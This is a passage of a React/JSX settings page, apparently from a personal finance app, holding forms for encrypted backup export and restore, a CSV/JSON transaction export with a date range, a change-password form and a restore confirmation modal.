                        <CheckCircle2 className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-positive-text)]" />
                        <span>Encrypted backup generated and downloaded successfully.</span>
                      </div>
                    )}
                    <Input
                      label="Backup Password"
                      type="password"
                      placeholder="Enter a strong password"
                      value={backupPassword}
                      onChange={(e) => setBackupPassword(e.target.value)}
                      required
                    />
                    <Button type="submit" block size="sm" loading={backupLoading} disabled={backupLoading} className="gap-1.5">
                      <Download className="h-4 w-4" /> Encrypt & Export Backup
                    </Button>
                  </form>
                </div>

                {/* Import Block */}
                <div className="space-y-4 border-t border-border-subtle/30 pt-6">
                  <h3 className="text-xs font-bold text-zinc-300 uppercase tracking-wider">Restore Backup</h3>
                  <form onSubmit={handleRestore} className="space-y-3">
                    {restoreError && (
                      <div className="rounded-xl bg-[var(--status-danger-subtle)] border border-[var(--status-danger-border)] p-2.5 text-[11px] text-[var(--status-danger-text)] leading-relaxed flex items-start gap-2">
                        <XCircle className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-danger-text)]" />
                        <span>{restoreError}</span>
                      </div>
                    )}
                    {restoreSuccess && (
                      <div className="rounded-xl bg-[var(--status-positive-subtle)] border border-[var(--status-positive-border)] p-2.5 text-[11px] text-[var(--status-positive-text)] leading-relaxed animate-fade-in flex items-start gap-2">
                        <CheckCircle2 className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-positive-text)]" />
                        <span>Backup successfully decrypted and data merged!</span>
                      </div>
                    )}
                    <div>
                      <label htmlFor="restore-file-input" className="block text-xs font-semibold text-zinc-500 uppercase tracking-wider mb-1.5 cursor-pointer">
                        Select Backup File (.drbak)
                      </label>
                      <input
                        id="restore-file-input"
                        type="file"
                        accept=".drbak"
                        className="w-full text-xs text-zinc-400 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-semibold file:bg-surface-2 file:text-zinc-300 hover:file:bg-surface-3 cursor-pointer"
                      />
                    </div>
                    <Input
                      label="Decryption Password"
                      type="password"
                      placeholder="Enter decryption password"
                      value={restorePassword}
                      onChange={(e) => setRestorePassword(e.target.value)}
                      required
                    />
                    <Button variant="secondary" type="submit" block loading={restoreLoading} disabled={restoreLoading} className="gap-1.5">
                      <Upload className="h-4 w-4" /> Decrypt & Merge Backup
                    </Button>
                  </form>
                </div>
              </div>
            </Card>
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-200 mb-2 flex items-center gap-2">
                <Download className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Data Portability (Plain Export)</span>
              </h2>
              <p className="text-xs text-zinc-400 mb-4 leading-relaxed">
                Export your transactions — approved and pending — in standard, human-readable formats for tax filing, spreadsheets, or migrations.
              </p>

              <div className="grid grid-cols-2 gap-3 mb-3">
                <div className="flex flex-col gap-1.5">
                  <label htmlFor="export-from" className="text-xs font-semibold text-zinc-500 uppercase tracking-wider">
                    From
                  </label>
                  <input
                    id="export-from"
                    type="date"
                    value={exportFrom}
                    max={exportTo || undefined}
                    onChange={(e) => { setExportFrom(e.target.value); setExportRangeError('') }}
                    className="bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-200 focus:outline-none focus:ring-1 focus:ring-brand-400 cursor-pointer"
                  />
                </div>
                <div className="flex flex-col gap-1.5">
                  <label htmlFor="export-to" className="text-xs font-semibold text-zinc-500 uppercase tracking-wider">
                    To
                  </label>
                  <input
                    id="export-to"
                    type="date"
                    value={exportTo}
                    min={exportFrom || undefined}
                    onChange={(e) => { setExportTo(e.target.value); setExportRangeError('') }}
                    className="bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-200 focus:outline-none focus:ring-1 focus:ring-brand-400 cursor-pointer"
                  />
                </div>
              </div>

              {exportRangeError && (
                <div role="alert" className="rounded-xl bg-[var(--status-danger-subtle)] border border-[var(--status-danger-border)] p-2.5 mb-3 text-xs text-[var(--status-danger-text)]">
                  {exportRangeError}
                </div>
              )}

              <div className="flex items-center justify-between mb-3">
                <p className="text-xs text-zinc-500">
                  {exportFrom || exportTo
                    ? `Exporting ${exportFrom ? formatDate(exportFrom) : 'the beginning'} → ${exportTo ? formatDate(exportTo) : 'today'}`
                    : 'Leave both blank to export everything'}
                </p>
                {(exportFrom || exportTo) && (
                  <button
                    onClick={() => { setExportFrom(''); setExportTo(''); setExportRangeError('') }}
                    className="text-xs text-brand-400 underline bg-transparent border-none cursor-pointer shrink-0"
                  >
                    Clear
                  </button>
                )}
              </div>

              <div className="flex gap-3">
                <Button
                  onClick={() => handlePlainExport('csv')}
                  variant="secondary"
                  className="flex-1 text-xs justify-center gap-1.5 cursor-pointer"
                  disabled={exportLoading}
                >
                  <FileSpreadsheet className="h-4 w-4 text-zinc-400 shrink-0" /> Export CSV
                </Button>
                <Button
                  onClick={() => handlePlainExport('json')}
                  variant="secondary"
                  className="flex-1 text-xs justify-center gap-1.5 cursor-pointer"
                  disabled={exportLoading}
                >
                  <FileJson className="h-4 w-4 text-zinc-400 shrink-0" /> Export JSON
                </Button>
              </div>
            </Card>
            {/* Change Password Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-200 mb-2 flex items-center gap-2">
                <Key className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Change Account Password</span>
              </h2>
              <p className="text-xs text-zinc-400 mb-2 leading-relaxed">
                Update your account password. Passwords must be at least 6 characters.
              </p>
              <p className="text-xs text-zinc-500 mb-4 leading-relaxed italic">
                Forgotten your password entirely? Use "Reset My Password" on your Profile page
                instead — it emails you a reset link.
              </p>
              <form onSubmit={handleChangePassword} className="space-y-3">
                {changePasswordError && (
                  <div role="alert" className="rounded-xl bg-[var(--status-danger-subtle)] border border-[var(--status-danger-border)] p-2.5 text-[11px] text-[var(--status-danger-text)] leading-relaxed flex items-start gap-2">
                    <XCircle className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-danger-text)]" />
                    <span>{changePasswordError}</span>
                  </div>
                )}
                {changePasswordSuccess && (
                  <div className="rounded-xl bg-[var(--status-positive-subtle)] border border-[var(--status-positive-border)] p-2.5 text-[11px] text-[var(--status-positive-text)] leading-relaxed flex items-start gap-2">
                    <CheckCircle2 className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-positive-text)]" />
                    <span>Password updated successfully!</span>
                  </div>
                )}
                <Input
                  label="New Password"
                  type="password"
                  placeholder="Enter new password"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  required
                  disabled={changePasswordLoading}
                />
                <Input
                  label="Confirm New Password"
                  type="password"
                  placeholder="Confirm new password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  required
                  disabled={changePasswordLoading}
                />
                <Button type="submit" block loading={changePasswordLoading} disabled={changePasswordLoading} className="gap-1.5">
                  <Check className="h-4 w-4" /> Update Password
                </Button>
              </form>
            </Card>
            </>
          )}
        </div>
      </div>

      {/* Restore Confirmation Modal */}
      <Modal
        isOpen={showRestoreConfirmModal}
        onClose={() => {
          setShowRestoreConfirmModal(false)
          setPendingRestoreData(null)
        }}
        title="Confirm Backup Restore"
        footer={
          <>
            <Button
              variant="secondary"
              onClick={() => {
                setShowRestoreConfirmModal(false)
                setPendingRestoreData(null)
              }}
            >
              Cancel
            </Button>
            <Button onClick={executeRestore}>
              Merge & Restore
            </Button>
          </>
        }
      >
        <div className="flex items-start gap-3">
          <HelpCircle className="h-5 w-5 text-brand-400 shrink-0 mt-0.5" />
          <p className="text-sm text-text-secondary leading-relaxed">
            Decrypted backup successfully containing {pendingRestoreData?.length || 0} transactions. Would you like to merge these with your current data? (Only non-duplicate transactions will be added)
          </p>
        </div>
      </Modal>
    </AppLayout>
  )
}
